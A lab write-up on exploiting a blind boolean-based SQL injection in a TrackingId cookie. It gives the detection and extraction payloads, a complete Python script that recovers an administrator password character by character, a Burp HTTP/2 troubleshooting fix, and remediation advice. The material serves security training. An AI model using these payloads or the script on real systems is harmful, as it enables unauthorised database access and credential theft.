1. Overview

This lab contains a blind SQL injection vulnerability in the TrackingId cookie. The application executes an SQL query containing the cookie value, but the results of the query are not returned to the user. Instead, we can only observe a boolean side effect: the page conditionally renders the text "Welcome back" based on whether the injected condition evaluates to TRUE or FALSE.

By asking the database a series of yes/no questions, we can extract arbitrary data — in this case, the administrator's password — one character at a time.

2. Understanding the Vulnerability

The backend query is presumably something like:

SELECT tracking_id FROM tracking WHERE tracking_id = '<COOKIE_VALUE>'

Because the cookie value is concatenated directly into the query without parameterization, we can inject our own SQL. The only feedback channel is whether the page contains the string "Welcome back".

Blind, Boolean-Based We never see query output. We infer data by asking the DB true/false questions and watching whether "Welcome back" appears in the response body.

3. Detecting the Injection

First, a baseline request with a normal TrackingId shows "Welcome back".

Inject a TRUE condition:

TrackingId=xyz' AND '1'='1'--

Response: "Welcome back" present

Inject a FALSE condition:

TrackingId=xyz' AND '1'='2'--

Response: "Welcome back" absent

Confirmed The application's response changes based on the truth value of our injected condition. We have a boolean oracle.

4. Crafting the Extraction Payload

We know from the lab description that there is a users table with columns username and password. To test whether the n-th character of the administrator's password equals some character c, we use: 

' AND (SELECT SUBSTRING(password,§n§,1)
         FROM users
         WHERE username='administrator') = '§c§'--

Injected into the cookie, the full value becomes:

TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

If the response contains "Welcome back", the character at position n is c. If not, it isn't. Repeat for every printable ASCII character (32–126) at every position (1–20) and reconstruct the password.

Response contains "Welcome back" Meaning
Yes Injected condition is TRUE → character is correct
No Injected condition is FALSE → try next character

5. The Exploit Script

Automating this manually would be painful. A small Python script using requests iterates over positions and characters, URL-encodes the payload, sets it as the TrackingId cookie, and checks for the presence of "Welcome back" in each response. 

import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES = {
    "http":  "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def sqli_password(url, tracking_id, session_cookie):
    password_extracted = ""
    session = requests.Session()
    session.headers.update({"Connection": "close", "User-Agent": "Mozilla/5.0"})

    for i in range(1, 21):
        found_character = False
        for j in range(32, 126):
            character = chr(j)

            sqli_payload = (
                "' and (select substring(password,%s,1) "
                "from users where username='administrator')='%s'--"
                % (i, character)
            )
            encoded_payload = urllib.parse.quote(sqli_payload, safe="")

            cookies = {
                "TrackingId": tracking_id + encoded_payload,
                "session": session_cookie,
            }

            r = session.get(url, cookies=cookies, verify=False,
                            proxies=PROXIES, timeout=15)

            if "Welcome back" in r.text:
                password_extracted += character
                found_character = True
                sys.stdout.write("\r" + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write("\r" + password_extracted + character)
                sys.stdout.flush()

        if not found_character:
            print("\n[!] No matching character found at position", i)
            break

    print("\n\n(+) Extracted password:", password_extracted)


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1].rstrip("/")
    print("(+) Retrieving administrator password...")

    tracking_id    = "V2SDQsntaFrXfEiH"
    session_cookie = "MaRLGdWP5oC7FdCK0BGzT2X07yiFNNLC"

    sqli_password(url, tracking_id, session_cookie)


if __name__ == "__main__":
    main()

6. The Burp HTTP/2 Pitfall

Error encountered requests.exceptions.ConnectionError: ('Connection aborted.', UnknownProtocol('HTTP/2'))

When routing traffic through Burp Suite, Burp defaults to negotiating HTTP/2 with the upstream server. The Python requests / urllib3 stack (especially on Python 3.13) speaks HTTP/1.1 and cannot parse the HTTP/2 response Burp forwards back. The connection aborts mid-extraction — which is why the password was recovered in fits and starts (ib6v1c0zegqcas, then ib6v1c0zegqcan, etc.).

Fix — disable HTTP/2 in Burp

Burp 2023.x / 2024.x:

  1. Open Settings → Tools → Proxy → HTTP
  2. Under HTTP/2, uncheck "Enable HTTP/2"
  3. Click Apply

Burp 2022.x: Proxy → Options → HTTP/2 → uncheck Enable HTTP/2.

Alternative — run without Burp

The simplest fix is to remove the proxies=PROXIES argument from the session.get() call so the script connects directly to the lab. Burp is then bypassed entirely and no protocol mismatch occurs. 

# Remove the proxies kwarg:
r = session.get(url, cookies=cookies, verify=False, timeout=15)
Trade-off Running without Burp means you lose the HTTP History / Repeater visibility. If you need to debug, disable HTTP/2 in Burp instead — it's the cleaner fix.

8. Remediation

  • Use parameterized queries / prepared statements — never concatenate user input into SQL.
  • Use an ORM or a query builder that enforces parameter binding.
  • Apply least privilege to the database user the app connects with.
  • Validate / whitelist input — a TrackingId should match a strict pattern (e.g. hex/alphanumeric), rejecting quotes and comment sequences.
  • Suppress verbose errors and avoid conditional rendering that leaks query truth values.
